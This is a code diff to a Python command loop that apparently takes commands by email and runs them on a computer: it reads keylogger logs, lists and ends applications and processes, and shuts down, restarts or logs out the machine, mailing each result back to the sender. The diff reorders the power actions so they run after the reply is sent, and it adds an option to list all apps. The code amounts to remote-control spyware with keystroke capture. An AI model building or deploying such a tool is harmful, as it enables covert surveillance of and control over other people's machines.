@@ -24,6 +24,7 @@ while True:
     
     result = ''
     image = None
+    shutd = restart = logout = False
 
     if 'EMPTY' in cmd:
         continue
@@ -46,13 +47,16 @@ while True:
             result += f'<br>Log: {keylog.getLog()}'
         elif '-l' in cmd:
             print(f'Log: {keylog.getLog()}')
-            result += f'Log: {keylog.getLog()}'
+            result += f'<br>Log: {keylog.getLog()}'
         else:
             result += keys
 
     elif cmd[0] == 'app':
         if cmd[1] == 'list':
-            appList = app.ListApp('-path' in cmd)
+            if '-all' in cmd:
+                appList = app.ListAllApp(cmd)
+            else:
+                appList = app.ListApp(cmd)
             print('List sent')
             result += appList
         elif cmd[1] == '-end':
@@ -69,15 +73,15 @@ while True:
             result += procList
 
     elif cmd[0] == 'shutdown':
-        Power.shutdown()
+        shutd = True
         result = 'Shutdown'
     
     elif cmd[0] == 'restart':
-        Power.restart()
+        restart = True
         result = 'Restarted'
     
     elif cmd[0] == 'logout':
-        Power.logout()
+        logout = True
         result = 'Logged out'
 
     else:
@@ -88,5 +92,11 @@ while True:
     if result != '':
         email.sendMail(sender, 'Your request has been executed', result, image)
     time.sleep(1)
-    
+    if shutd:
+        Power.shutdown()
+    elif restart:
+        Power.restart()
+    elif logout:
+        Power.logout()
+
 
